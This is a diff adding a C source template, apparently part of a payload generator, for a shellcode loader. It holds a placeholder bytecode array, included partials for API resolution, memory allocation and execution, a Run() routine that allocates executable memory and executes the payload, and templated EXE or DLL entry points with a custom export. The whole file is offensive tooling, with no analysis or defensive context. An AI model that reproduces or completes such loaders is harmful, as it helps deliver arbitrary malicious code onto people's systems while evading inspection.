@@ -1,0 +1,61 @@
+#include <windows.h>
+#ifdef DEBUG
+    #include <stdio.h>
+    #include <debugapi.h>
+#endif
+
+#ifdef DEBUG
+    char debug_buffer[512];
+    #define DEBUG_PRINT(fmt, ...) \
+        do { \
+            sprintf(debug_buffer, "DEBUG: " fmt "\n", ##__VA_ARGS__); \
+            OutputDebugStringA(debug_buffer); \
+        } while (0)
+#else
+    #define DEBUG_PRINT(fmt, ...)
+#endif
+
+// --- Bytecode Placeholder ---
+unsigned char bytecode[] = { {{ bytecode_array }} };
+unsigned int bytecode_len = sizeof(bytecode);
+
+// --- DYNAMICALLY INCLUDE PARTIALS ---
+{% include 'partials/api_resolver.c.j2' %}
+{% include allocation_partial %}
+{% include execution_partial %}
+
+// --- Function Forward Declarations ---
+void* AllocateExecutableMemory(SIZE_T size);
+void ExecutePayload(void* exec_mem);
+void ResolveAPIs();
+
+// --- Main Orchestration Logic ---
+void Run() {
+    void* memory_block;
+    
+    ResolveAPIs();
+    
+    memory_block = AllocateExecutableMemory(bytecode_len);
+    
+    ExecutePayload(memory_block);
+}
+
+// --- Entry Point (EXE or DLL) ---
+{% if output_format == 'dll' %}
+void WINAPI {{ export_name }}() {
+    Run();
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        // We're not executing from DllMain to avoid loaderlock
+    }
+    return TRUE;
+}
+{% else %}
+int main(int argc, char *argv[]) {
+    Run();
+    return 0;
+}
+{% endif %}
+
